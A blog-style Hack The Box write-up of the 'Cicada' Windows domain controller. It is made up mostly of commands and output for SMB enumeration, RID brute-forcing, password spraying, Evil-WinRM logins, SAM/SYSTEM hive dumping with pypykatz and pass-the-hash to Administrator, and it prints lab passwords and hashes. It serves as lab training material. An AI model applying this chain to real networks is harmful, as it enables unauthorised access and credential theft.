---
layout: post
title: Hackthebox cicada Machine Writeup
tags: [Credential Compromise, Privilege Escalation, ]
description: Detailed writeup of [Cicada](https://www.hackthebox.com/machines/cicada)
---



<div style="display: flex; justify-content: center;">
  <img src="/assets/HTB/banner.png" alt="HTB Banner" style="max-width: 100%; height: auto; text-align: center;">
</div>

- OS Wndows
####
Initial reconnaissance of the target machine revealed a domain controller through comprehensive Nmap scanning. Exploring the SMB service anonymously uncovered a critical /HR directory containing a recruitment notice with potential credential insights. Employing enumeration tools like enum4linux and nxc, I systematically mapped user accounts and validated potential entry points. Kerbrute assisted in username verification, ultimately leveraging discovered credentials to establish initial access. This methodical approach provided a strategic foothold for further privilege escalation and comprehensive system exploration within the controlled Hack The Box environment.



##### Nmap Scan 
```
┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# nmap -sC -sV -Pn -A 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up (0.30s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-15 01:32:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-15T01:33:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   354.29 ms 10.10.16.1
2   354.74 ms 10.10.11.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.87 seconds
```

After seeing Nmap scan i thought of checking Open shares, Users list So that i used **nxc** which is updated to crackmapexc.

``` 
┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# nxc  smb cicada.htb -u 'guest'  -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```
In this HR Having read access to few files, Let's view those.
```
──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# smbclient //cicada.htb/HR -N
smb: \> LS
  .                                   D        0  Thu Mar 14 17:59:09 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 23:01:48 2024

smb: \> get  Notice from HR.txt  
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice 
```
```
──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8 
To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

I found a password in HR.txt But now i don't know username linked to password, So that i started to bruteforce all username using rid-brute.

```
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ nxc smb cicada.htb -u "guest" -p '' --rid-brute | grep SidTypeUser
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

```
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ nano username.txt                
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```
Let's try to enumarate username with above password.
```
                                                                                                                                                              
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ nxc smb cicada.htb -u usernames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
                                                                                                                                                              
```


Gather detailed information about the target Windows/Samba system

```
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ enum4linux -a -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' cicada.htb
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 15 18:33:47 2024

 =========================================( Target Information )=========================================

Target ........... cicada.htb
RID Range ........ 500-550,1000-1050
Username ......... 'michael.wrightson'
Password ......... 'Cicada$M6Corpb*@Lp#nZp!8'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 =================================( Nbtstat Information for cicada.htb )=================================

Looking up status of 10.10.11.35
No reply from 10.10.11.35

 ====================================( OS information on cicada.htb )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for cicada.htb from srvinfo: 
	CICADA.HTB     Wk Sv PDC Tim NT     CICADA-DC
	platform_id     :	500
	os version      :	10.0
	server type     :	0x80102b


 ========================================( Users on cicada.htb )========================================

index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious	Name: (null)	Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
index: 0x101d RID: 0x641 acb: 0x00000210 Account: emily.oscars	Name: Emily Oscars	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfe7 RID: 0x450 acb: 0x00000210 Account: john.smoulder	Name: (null)	Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfe9 RID: 0x452 acb: 0x00000210 Account: michael.wrightson	Name: (null)	Desc: (null)
index: 0xfe8 RID: 0x451 acb: 0x00000210 Account: sarah.dantelia	Name: (null)	Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.smoulder] rid:[0x450]
user:[sarah.dantelia] rid:[0x451]
user:[michael.wrightson] rid:[0x452]
user:[david.orelious] rid:[0x454]
user:[emily.oscars] rid:[0x641]
```

In above enumerration david.orelious Left his password in description.

```
┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# smbclient //CICADA.HTB/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Thu Mar 14 18:01:39 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 22:58:22 2024

		4168447 blocks of size 4096. 413454 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```
```
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ cat  Backup_script.ps1           

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Again from  david.orelious Shares we got emily.oscars password. Let's try to enumerate emily.oscars Windows/Samba system.
```
┌──(angrybird㉿kali)-[~/Desktop]
└─$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/15/2024   3:01 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
****************************
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd c:\
*Evil-WinRM* PS C:\> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/22/2024  11:45 AM                PerfLogs
d-r---         8/29/2024  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         3/14/2024   5:21 AM                Shares
d-----        11/15/2024   3:39 PM                temp
d-r---         8/26/2024   1:11 PM                Users
d-----         9/23/2024   9:35 AM                Windows


*Evil-WinRM* PS C:\> -a----        11/15/2024   1:53 PM          49152 sam.save 
The term '-a----' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ -a----        11/15/2024   1:53 PM          49152 sam.save
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (-a----:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
^C
                                        
Warning: Press "y" to exit, press any other key to continue

y
*Evil-WinRM* PS C:\> 
*Evil-WinRM* PS C:\> y
The term 'y' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ y
+ ~
    + CategoryInfo          : ObjectNotFound: (y:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\> reg save hklm\sam c:\temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> download sam
                                        
Info: Downloading C:\\sam to sam
                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024   4:27 PM          49152 sam
-a----        11/15/2024   4:28 PM       18518016 system


d*Evil-WinRM* PS C:\temp> download sam
                                        
Info: Downloading C:\temp\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system
                                        
Info: Downloading C:\temp\system to system
                                          
Info: Download successful!
*Evil-WinRM* PS C:\temp> exit
^C
                                        
Warning: Press "y" to exit, press any other key to continue
                                        
Info: Exiting...

                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
```
Used Evil-WinRM to log in as emily.oscars, accessed system files, In this i got user flag and extracted sensitive SAM and SYSTEM registry hives from the Windows machine at cicada.htb. Help's for offline password cracking.
```                                                                             
┌──(angrybird㉿kali)-[~/Desktop]
└─$ ls -la

-rw-rw-r--  1 angrybird angrybird     49152 Nov 15 22:59  sam
-rw-rw-r--  1 angrybird angrybird  18518016 Nov 15 23:07  system
```
```                                                                         
┌──(angrybird㉿kali)-[~/Desktop]
└─$ pypykatz registry --sam sam system             

WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

pypykatz didn't worked at begining, After some research i updated code. And then Used to extract password hashes from the previously downloaded SAM and SYSTEM registry files, Successfully extracted system boot key and user account password hashes. Retrieved hashes for Administrator, Guest, DefaultAccount, and WDAGUtilityAccount.

```									     
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
    Directory: C:\Users\Administrator\Documents
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/14/2024  10:20 PM                WindowsPowerShell


cd*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls

    Directory: C:\Users\Administrator

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/14/2024   3:45 AM                3D Objects
d-r---         3/14/2024   3:45 AM                Contacts
d-r---         8/30/2024  10:06 AM                Desktop
d-r---         3/14/2024  10:20 PM                Documents
d-r---         3/14/2024   3:45 AM                Downloads
d-r---         3/14/2024   3:45 AM                Favorites
d-r---         3/14/2024   3:45 AM                Links
d-r---         3/14/2024   3:45 AM                Music
d-r---         3/14/2024   3:45 AM                Pictures
d-r---         3/14/2024   3:45 AM                Saved Games
d-r---         3/14/2024   3:45 AM                Searches
d-r---         3/14/2024   3:45 AM                Videos


cd *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/15/2024   3:01 PM             34 root.txt


cat*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
*****************************
*Evil-WinRM* PS C:\Users\Administrator\Desktop> enum4lin
                                        
Warning: Press "y" to exit, press any other key to continue
```

Logged in as Administrator using the previously extracted hash via Evil-WinRM. Navigated through Administrator's user directories. Accessed Desktop folder
Retrieved and read root.txt.
